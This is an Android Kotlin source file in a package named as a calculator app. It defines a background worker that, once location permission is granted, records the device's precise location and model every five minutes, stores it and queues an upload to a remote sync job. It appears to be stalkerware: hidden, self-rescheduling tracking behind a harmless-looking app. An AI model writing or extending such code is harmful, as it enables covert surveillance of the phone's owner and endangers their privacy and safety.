package com.android.mycalculator

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.os.Build
import android.os.Looper
import androidx.core.app.ActivityCompat
import androidx.work.*
import com.google.android.gms.location.*
import java.util.concurrent.TimeUnit
import com.google.android.gms.tasks.Tasks
class LocationWorker(context: Context, params: WorkerParameters) : Worker(context, params) {

    override fun doWork(): Result {
        // Check permissions first
        if (ActivityCompat.checkSelfPermission(applicationContext, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(applicationContext, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return Result.failure()
        }

        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(applicationContext)
        val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000)
            .setMinUpdateIntervalMillis(4000)
            .build()

        // Use a blocking call to get the last known location (or request a single update)
        var location: Location? = null
try {
    val locationTask = fusedLocationClient.lastLocation
    location = com.google.android.gms.tasks.Tasks.await(locationTask, 10, TimeUnit.SECONDS)
} catch (e: Exception) {
    e.printStackTrace()
}

        if (location != null) {
            val dbHelper = DatabaseHelper.getInstance(applicationContext)
            val device = "${Build.MANUFACTURER} ${Build.MODEL}"
            dbHelper.insertLocationLog(
                device,
                location.latitude,
                location.longitude,
                location.accuracy,
                location.provider ?: "unknown",
                System.currentTimeMillis()
            )

            // Trigger sync (same way NotificationService does)
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()
            val syncWork = OneTimeWorkRequestBuilder<SyncWorker>()
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.LINEAR, 5, TimeUnit.MINUTES)
                .build()
            WorkManager.getInstance(applicationContext).enqueueUniqueWork(
                "LocationSyncWork",
                ExistingWorkPolicy.REPLACE,
                syncWork
            )
        }

        // Schedule the next run in 5 minutes
        scheduleNextLocationWork()

        return Result.success()
    }

    private fun scheduleNextLocationWork() {
        val nextWork = OneTimeWorkRequestBuilder<LocationWorker>()
            .setInitialDelay(5, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(applicationContext).enqueueUniqueWork(
            "PeriodicLocationWork",
            ExistingWorkPolicy.REPLACE,
            nextWork
        )
    }

    companion object {
        fun startLocationTracking(context: Context) {
            val workRequest = OneTimeWorkRequestBuilder<LocationWorker>()
                .setInitialDelay(5, TimeUnit.MINUTES)
                .build()
            WorkManager.getInstance(context).enqueueUniqueWork(
                "PeriodicLocationWork",
                ExistingWorkPolicy.KEEP,
                workRequest
            )
        }
    }
}
